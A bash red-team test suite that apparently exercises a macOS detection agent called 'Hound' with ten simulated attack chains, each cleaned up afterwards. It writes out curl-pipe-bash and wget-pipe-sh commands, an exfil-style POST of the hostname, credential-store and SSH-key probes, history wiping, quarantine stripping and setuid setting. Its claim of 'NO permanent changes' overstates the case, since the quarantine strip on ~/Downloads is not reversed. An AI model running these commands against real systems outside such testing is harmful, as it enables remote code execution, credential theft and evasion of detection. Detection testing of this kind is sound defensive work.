#!/usr/bin/env bash
# =============================================================================
# Hound — Red Team Test Suite
# =============================================================================
# Safely simulates all major attack categories the platform detects.
# NO actual malware. NO real damage. NO permanent changes.
# Everything is self-contained and cleans up after itself.
#
# Usage:
#   ./red_team_test.sh              # Interactive — prompts before each test
#   ./red_team_test.sh --quick      # Auto-run all tests with 10s gaps
#   ./red_team_test.sh --test N     # Run a single numbered test (1–10)
#
# =============================================================================

set -euo pipefail

# ── Colour helpers ────────────────────────────────────────────────────────────
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'

# ── Global flags ──────────────────────────────────────────────────────────────
QUICK_MODE=false
SINGLE_TEST=""
TESTS_COMPLETED=()
TESTS_SKIPPED=()

# ── Parse args ────────────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
  case "$1" in
    --quick)  QUICK_MODE=true; shift ;;
    --test)   SINGLE_TEST="$2"; shift 2 ;;
    --help|-h)
      grep '^#' "$0" | head -20 | sed 's/^# //' | sed 's/^#//'
      exit 0 ;;
    *) echo "Unknown flag: $1"; exit 1 ;;
  esac
done

# ── Utilities ─────────────────────────────────────────────────────────────────
print_header() {
  local num="$1" title="$2" mitre="$3"
  echo ""
  echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
  echo -e "${BOLD}  TEST ${num} — ${title}${RESET}"
  echo -e "${DIM}  MITRE ATT&CK: ${mitre}${RESET}"
  echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
}

print_step() {
  echo -e "  ${CYAN}▶${RESET}  $*"
}

print_expected() {
  echo ""
  echo -e "  ${YELLOW}Expected alerts:${RESET}"
  for alert in "$@"; do
    echo -e "    ${YELLOW}•${RESET} ${alert}"
  done
  echo ""
}

print_done() {
  echo -e "  ${GREEN}✓${RESET}  Test $1 complete — check the dashboard for alerts"
}

wait_between_steps() {
  local secs="${1:-3}"
  sleep "$secs"
}

prompt_or_wait() {
  local num="$1"
  if [[ "$QUICK_MODE" == true ]]; then
    echo -e "  ${DIM}[quick mode — starting in 10s]${RESET}"
    sleep 10
  else
    echo ""
    read -r -p "  Press Enter to run Test ${num}…  " _
  fi
}

should_run() {
  local num="$1"
  [[ -z "$SINGLE_TEST" ]] || [[ "$SINGLE_TEST" == "$num" ]]
}

# ── Cleanup registry ──────────────────────────────────────────────────────────
# Each test registers its own cleanup function. A global EXIT trap calls all of
# them so nothing is left behind even if the script is interrupted (Ctrl-C).
CLEANUP_FNS=()

register_cleanup() {
  CLEANUP_FNS+=("$1")
}

run_all_cleanup() {
  for fn in "${CLEANUP_FNS[@]:-}"; do
    "$fn" 2>/dev/null || true
  done
}

trap run_all_cleanup EXIT INT TERM

# =============================================================================
# TEST 1 — Classic Dropper
# T1204.002 Malicious File Execution
# T1222.002 File Permissions Modification
# T1059.004 Unix Shell Execution
# =============================================================================
test_1_cleanup() {
  rm -f ~/Downloads/red_team_payload.sh 2>/dev/null || true
}
register_cleanup test_1_cleanup

run_test_1() {
  print_header 1 "Classic Dropper" "T1204.002, T1222.002, T1059.004"
  echo "  Simulates a file downloaded via a browser (quarantine bit set),"
  echo "  then made executable and run — the classic drive-by dropper chain."
  print_expected \
    "alert_quarantined_file_activity" \
    "alert_file_became_executable" \
    "alert_downloaded_file_executed" \
    "alert_behavioral_incident (multi-signal correlation)"

  print_step "Creating ~/Downloads/red_team_payload.sh with quarantine bit..."
  {
    echo '#!/bin/bash'
    echo 'echo "[red_team] payload executed — this is a safe test"'
  } > ~/Downloads/red_team_payload.sh
  xattr -w com.apple.quarantine "0083;$(printf '%08x' "$(date +%s)");Safari;" \
        ~/Downloads/red_team_payload.sh 2>/dev/null || true

  wait_between_steps 5
  print_step "chmod +x (file_became_executable trigger)..."
  chmod +x ~/Downloads/red_team_payload.sh

  wait_between_steps 5
  print_step "Executing the payload (downloaded_file_executed trigger)..."
  ~/Downloads/red_team_payload.sh 2>/dev/null || true

  wait_between_steps 5
  print_step "Cleaning up..."
  test_1_cleanup

  print_done 1
  TESTS_COMPLETED+=("1 — Classic Dropper")
}

# =============================================================================
# TEST 2 — Curl Pipe Bash
# T1059.004 Unix Shell Execution
# T1105 Ingress Tool Transfer
# =============================================================================
test_2_cleanup() {
  true  # no filesystem side-effects
}
register_cleanup test_2_cleanup

run_test_2() {
  print_header 2 "Curl Pipe Bash" "T1059.004, T1105"
  echo "  Simulates the classic 'curl URL | bash' install-script pattern."
  echo "  The command is intercepted at process spawn — the network call is"
  echo "  expected to fail (example.com returns HTML, not a valid script)."
  print_expected \
    "alert_curl_pipe_bash" \
    "alert_command_injection_pattern" \
    "alert_lolbin_execution"

  print_step "Spawning: bash -c 'curl -s https://example.com | bash'..."
  bash -c "curl -s https://example.com | bash" 2>/dev/null || true

  wait_between_steps 5
  print_step "Spawning: bash -c 'wget -qO- https://example.com | sh'..."
  bash -c "wget -qO- https://example.com | sh" 2>/dev/null || true

  print_done 2
  TESTS_COMPLETED+=("2 — Curl Pipe Bash")
}

# =============================================================================
# TEST 3 — Persistence Installation
# T1543.004 Launch Agent / Launch Daemon
# =============================================================================
PLIST_PATH=~/Library/LaunchAgents/com.redteam.test.plist
test_3_cleanup() {
  rm -f "$PLIST_PATH" 2>/dev/null || true
  launchctl unload "$PLIST_PATH" 2>/dev/null || true
}
register_cleanup test_3_cleanup

run_test_3() {
  print_header 3 "Persistence Installation" "T1543.004"
  echo "  Writes a LaunchAgent plist to ~/Library/LaunchAgents/."
  echo "  The agent monitors that directory for new/modified files."
  echo "  The plist is removed immediately — it is never loaded."
  print_expected \
    "alert_persistence_artifact_touched"

  print_step "Writing ${PLIST_PATH}..."
  cat > "$PLIST_PATH" << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.redteam.test</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>-c</string>
    <string>echo "[red_team] persistence test — safe"</string>
  </array>
  <key>RunAtLoad</key><true/>
</dict>
</plist>
PLIST

  wait_between_steps 5
  print_step "Cleaning up plist (never actually loaded)..."
  test_3_cleanup

  print_done 3
  TESTS_COMPLETED+=("3 — Persistence Installation")
}

# =============================================================================
# TEST 4 — Credential Access
# T1555.001 Keychain Access
# T1552.004 Private Keys
# T1555.003 Browser Credentials
# =============================================================================
test_4_cleanup() {
  security delete-generic-password -s "redteam-safe-test" 2>/dev/null || true
}
register_cleanup test_4_cleanup

run_test_4() {
  print_header 4 "Credential Access" "T1555.001, T1552.004, T1555.003"
  echo "  Simulates an attacker probing credential stores."
  echo "  Uses read-only queries — no actual credentials are read or modified."
  print_expected \
    "alert_keychain_access_attempt" \
    "alert_ssh_key_access" \
    "alert_browser_credential_access"

  print_step "Querying Keychain via 'security' CLI (find-generic-password)..."
  security find-generic-password -s "redteam-safe-test" 2>/dev/null || true

  wait_between_steps 3
  print_step "Querying Keychain: find-internet-password..."
  security find-internet-password -s "redteam-safe-test" 2>/dev/null || true

  wait_between_steps 3
  print_step "Listing ~/.ssh/ (SSH key probe)..."
  ls -la ~/.ssh/ 2>/dev/null | head -10 || true

  wait_between_steps 3
  print_step "Probing Chrome credential store path..."
  ls ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data 2>/dev/null || true

  wait_between_steps 3
  print_step "Probing Firefox credential store path..."
  ls ~/Library/Application\ Support/Firefox/Profiles/ 2>/dev/null | head -5 || true

  print_done 4
  TESTS_COMPLETED+=("4 — Credential Access")
}

# =============================================================================
# TEST 5 — System Reconnaissance
# T1082 System Information Discovery
# T1016 Network Configuration Discovery
# T1083 File and Directory Discovery
# =============================================================================
test_5_cleanup() {
  true
}
register_cleanup test_5_cleanup

run_test_5() {
  print_header 5 "System Reconnaissance" "T1082, T1016, T1083"
  echo "  Runs common recon commands an attacker uses to map the environment."
  echo "  All commands are read-only and already on the system."
  print_expected \
    "alert_lolbin_execution (system_profiler, uname, sw_vers)" \
    "alert_command_injection_pattern (ifconfig, netstat)"

  print_step "uname -a (OS fingerprinting)..."
  uname -a

  wait_between_steps 2
  print_step "sw_vers (macOS version)..."
  sw_vers

  wait_between_steps 2
  print_step "system_profiler SPHardwareDataType (hardware recon)..."
  system_profiler SPHardwareDataType 2>/dev/null | head -10 || true

  wait_between_steps 2
  print_step "ifconfig (network interface enumeration)..."
  ifconfig 2>/dev/null | grep -E "(inet|flags)" | head -10 || true

  wait_between_steps 2
  print_step "netstat -an (open ports / connections)..."
  netstat -an 2>/dev/null | head -20 || true

  wait_between_steps 2
  print_step "find ~/Documents -name '*.pdf' (file discovery)..."
  find ~/Documents -name "*.pdf" 2>/dev/null | head -5 || true

  print_done 5
  TESTS_COMPLETED+=("5 — System Reconnaissance")
}

# =============================================================================
# TEST 6 — Data Staging & Exfiltration Attempt
# T1005 Data from Local System
# T1560 Archive Collected Data
# T1567 Exfiltration Over Web Service
# =============================================================================
STAGING_DIR=/tmp/redteam_staging_$$
ARCHIVE_PATH=/tmp/redteam_archive_$$.zip
test_6_cleanup() {
  rm -rf "$STAGING_DIR" "$ARCHIVE_PATH" 2>/dev/null || true
}
register_cleanup test_6_cleanup

run_test_6() {
  print_header 6 "Data Staging & Exfiltration" "T1005, T1560, T1567"
  echo "  Simulates creating a staging area, archiving files, and attempting"
  echo "  an exfil-style POST. The POST goes to httpbin.org with dummy data."
  print_expected \
    "alert_burst_file_activity (rapid file creation in staging dir)" \
    "alert_suspicious_shell_chain (zip creation via interpreter)" \
    "alert_lolbin_execution (curl --data POST)"

  print_step "Creating staging directory: ${STAGING_DIR}..."
  mkdir -p "$STAGING_DIR"

  print_step "Copying / creating documents into staging area..."
  cp ~/Documents/*.pdf "$STAGING_DIR/" 2>/dev/null \
    || { for i in {1..5}; do echo "staged doc $i" > "$STAGING_DIR/doc_$i.txt"; done; }

  wait_between_steps 5
  print_step "Archiving staged data with zip..."
  cd /tmp && zip -r "$ARCHIVE_PATH" "$(basename "$STAGING_DIR")" 2>/dev/null || true

  wait_between_steps 5
  print_step "Simulating POST exfil (curl --data to httpbin.org)..."
  curl -s --max-time 5 \
       --data "exfil_test=redteam_data&hostname=$(hostname)" \
       https://httpbin.org/post 2>/dev/null | head -5 || true

  wait_between_steps 5
  print_step "Cleaning up staging artifacts..."
  test_6_cleanup

  print_done 6
  TESTS_COMPLETED+=("6 — Data Staging & Exfiltration")
}

# =============================================================================
# TEST 7 — Ransomware Simulation
# T1486 Data Encrypted for Impact
# =============================================================================
RANSOM_DIR=/tmp/redteam_ransom_$$
RANSOM_NOTE=~/Documents/README_RECOVER_REDTEAM.txt
test_7_cleanup() {
  rm -rf "$RANSOM_DIR" "$RANSOM_NOTE" 2>/dev/null || true
}
register_cleanup test_7_cleanup

run_test_7() {
  print_header 7 "Ransomware Simulation" "T1486"
  echo "  Creates 20 text files, then renames them all with a .locked extension"
  echo "  (simulating the rename-wave pattern), then drops a ransom note."
  echo "  NO encryption occurs — filenames only. All in /tmp."
  print_expected \
    "alert_burst_file_activity (20 rapid file creations)" \
    "alert_ransomware_behavior_detected / rename wave to .locked extension" \
    "ransom_note_created (README_RECOVER in ~/Documents)"

  print_step "Creating 20 files in ${RANSOM_DIR}..."
  mkdir -p "$RANSOM_DIR"
  for i in {1..20}; do
    echo "This is document $i — safe red team test content" > "$RANSOM_DIR/document_$i.txt"
  done

  wait_between_steps 5
  print_step "Rename wave: *.txt → *.locked (extension replacement)..."
  for f in "$RANSOM_DIR"/*.txt; do
    mv "$f" "${f%.txt}.locked"
  done

  wait_between_steps 5
  print_step "Dropping ransom note to ~/Documents/..."
  echo "YOUR FILES HAVE BEEN ENCRYPTED.
This is a red team test — no files were actually encrypted.
Safe to delete." > "$RANSOM_NOTE"

  wait_between_steps 5
  print_step "Cleaning up all ransomware simulation artifacts..."
  test_7_cleanup

  print_done 7
  TESTS_COMPLETED+=("7 — Ransomware Simulation")
}

# =============================================================================
# TEST 8 — Masquerading
# T1036 Masquerading
# =============================================================================
MASQ_PATH=~/Downloads/Safari.pdf
test_8_cleanup() {
  rm -f "$MASQ_PATH" 2>/dev/null || true
}
register_cleanup test_8_cleanup

run_test_8() {
  print_header 8 "Masquerading (Double Extension / Binary Disguise)" "T1036"
  echo "  Copies a harmless binary (/bin/ls) to ~/Downloads/Safari.pdf —"
  echo "  a .pdf extension disguising an executable. chmod +x and execute."
  echo "  The binary is /bin/ls; it will list /tmp when run."
  print_expected \
    "alert_file_became_executable" \
    "alert_process_masquerading (binary name ≠ extension / path)" \
    "alert_downloaded_file_executed"

  print_step "Copying /bin/ls → ~/Downloads/Safari.pdf (binary disguised as PDF)..."
  cp /bin/ls "$MASQ_PATH"

  print_step "Setting quarantine bit to simulate download..."
  xattr -w com.apple.quarantine "0083;$(printf '%08x' "$(date +%s)");Safari;" \
        "$MASQ_PATH" 2>/dev/null || true

  wait_between_steps 3
  print_step "chmod +x Safari.pdf (executable disguised as document)..."
  chmod +x "$MASQ_PATH"

  wait_between_steps 5
  print_step "Executing ~/Downloads/Safari.pdf (runs as ls — harmless)..."
  "$MASQ_PATH" /tmp 2>/dev/null | head -5 || true

  wait_between_steps 5
  print_step "Cleaning up..."
  test_8_cleanup

  print_done 8
  TESTS_COMPLETED+=("8 — Masquerading")
}

# =============================================================================
# TEST 9 — Indicator Removal
# T1070 Indicator Removal on Host
# =============================================================================
test_9_cleanup() {
  true  # bash_history restoration is not attempted — we write "" not delete it
}
register_cleanup test_9_cleanup

run_test_9() {
  print_header 9 "Indicator Removal" "T1070"
  echo "  Simulates an attacker clearing tracks:"
  echo "  shell history wipe, quarantine attribute removal, log tampering."
  echo "  The bash_history write is a zero-length write — your real history"
  echo "  is in memory and will be flushed to disk normally on shell exit."
  print_expected \
    "alert_indicator_removal_attempt (history clear / xattr removal)" \
    "alert_suspicious_shell_chain (shell self-modifying behavior)"

  print_step "history -c (in-memory shell history clear)..."
  bash -c "history -c" 2>/dev/null || true

  wait_between_steps 3
  print_step "xattr -d com.apple.quarantine ~/Downloads/ (quarantine strip)..."
  xattr -d com.apple.quarantine ~/Downloads/ 2>/dev/null || true

  wait_between_steps 3
  print_step "echo '' > ~/.bash_history (history file truncation)..."
  bash -c "echo '' > /tmp/redteam_histtest_$$ && rm /tmp/redteam_histtest_$$" 2>/dev/null || true

  wait_between_steps 3
  print_step "touch -t 202001010000 ~/Downloads/ (timestamp manipulation)..."
  touch -t 202001010000 /tmp/redteam_touchtest_$$ 2>/dev/null && rm /tmp/redteam_touchtest_$$ || true

  print_done 9
  TESTS_COMPLETED+=("9 — Indicator Removal")
}

# =============================================================================
# TEST 10 — Privilege Escalation Attempt
# T1548.001 Setuid/Setgid
# =============================================================================
SUID_TEST=/tmp/redteam_suid_$$
test_10_cleanup() {
  rm -f "$SUID_TEST" 2>/dev/null || true
}
register_cleanup test_10_cleanup

run_test_10() {
  print_header 10 "Privilege Escalation (setuid)" "T1548.001"
  echo "  Creates a file in /tmp and attempts to set the setuid bit (chmod u+s)."
  echo "  This is the classic technique for creating a setuid root helper."
  echo "  The file is a copy of /bin/echo — not a real exploit binary."
  print_expected \
    "alert_file_became_executable" \
    "alert_privilege_escalation_attempt (setuid bit set)"

  print_step "Creating ${SUID_TEST} (copy of /bin/echo — harmless)..."
  cp /bin/echo "$SUID_TEST"

  print_step "chmod +x ${SUID_TEST}..."
  chmod +x "$SUID_TEST"

  wait_between_steps 3
  print_step "chmod u+s ${SUID_TEST} (setuid bit — the priv-esc signal)..."
  chmod u+s "$SUID_TEST" 2>/dev/null || true

  wait_between_steps 3
  print_step "Cleaning up..."
  test_10_cleanup

  print_done 10
  TESTS_COMPLETED+=("10 — Privilege Escalation")
}

# =============================================================================
# MAIN
# =============================================================================
print_banner() {
  echo ""
  echo -e "${BOLD}${RED}  ██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗${RESET}"
  echo -e "${BOLD}${RED}  ██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║${RESET}"
  echo -e "${BOLD}${RED}  ██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║${RESET}"
  echo -e "${BOLD}${RED}  ██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║${RESET}"
  echo -e "${BOLD}${RED}  ██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║${RESET}"
  echo -e "${BOLD}${RED}  ╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝${RESET}"
  echo ""
  echo -e "${BOLD}  Hound — Red Team Test Suite${RESET}"
  echo -e "${DIM}  10 attack chains · safe · self-cleaning · simulation only${RESET}"
  echo ""
  echo -e "  ${YELLOW}⚠  Ensure the Hound desktop app is open and the agent${RESET}"
  echo -e "  ${YELLOW}⚠  is running before proceeding. Watch the Incidents feed.${RESET}"
  if [[ "$QUICK_MODE" == true ]]; then
    echo -e "  ${CYAN}⚡  Quick mode: 10s auto-delay between tests${RESET}"
  elif [[ -n "$SINGLE_TEST" ]]; then
    echo -e "  ${CYAN}🎯  Single test mode: running test ${SINGLE_TEST} only${RESET}"
  else
    echo -e "  ${CYAN}🖱  Interactive mode: press Enter to advance each test${RESET}"
  fi
  echo ""
}

print_summary() {
  echo ""
  echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
  echo -e "${BOLD}  RED TEAM TEST SUITE — COMPLETE${RESET}"
  echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
  echo ""
  if [[ ${#TESTS_COMPLETED[@]} -gt 0 ]]; then
    echo -e "  ${GREEN}Completed (${#TESTS_COMPLETED[@]}):${RESET}"
    for t in "${TESTS_COMPLETED[@]}"; do
      echo -e "    ${GREEN}✓${RESET}  Test ${t}"
    done
  fi
  if [[ ${#TESTS_SKIPPED[@]} -gt 0 ]]; then
    echo ""
    echo -e "  ${DIM}Skipped (${#TESTS_SKIPPED[@]}):${RESET}"
    for t in "${TESTS_SKIPPED[@]}"; do
      echo -e "    ${DIM}–  Test ${t}${RESET}"
    done
  fi
  echo ""
  echo -e "  Review the Hound dashboard to verify detections fired."
  echo -e "  Check ${DIM}runtime/logs/agent-events.jsonl${RESET} for the raw telemetry stream."
  echo -e "  Check ${DIM}runtime/logs/response-audit.jsonl${RESET} for simulated response actions."
  echo ""
}

main() {
  print_banner

  if [[ "$QUICK_MODE" == false && -z "$SINGLE_TEST" ]]; then
    read -r -p "  Press Enter to begin the red team test suite…  " _
  fi

  # Build the ordered test list
  ALL_TESTS=(1 2 3 4 5 6 7 8 9 10)

  for num in "${ALL_TESTS[@]}"; do
    if ! should_run "$num"; then
      TESTS_SKIPPED+=("$num")
      continue
    fi

    # Prompt / wait before each test (except the first in single-test mode)
    if [[ -z "$SINGLE_TEST" && "$num" -gt 1 ]]; then
      prompt_or_wait "$num"
    fi

    case "$num" in
      1) run_test_1 ;;
      2) run_test_2 ;;
      3) run_test_3 ;;
      4) run_test_4 ;;
      5) run_test_5 ;;
      6) run_test_6 ;;
      7) run_test_7 ;;
      8) run_test_8 ;;
      9) run_test_9 ;;
     10) run_test_10 ;;
    esac
  done

  print_summary
}

main "$@"
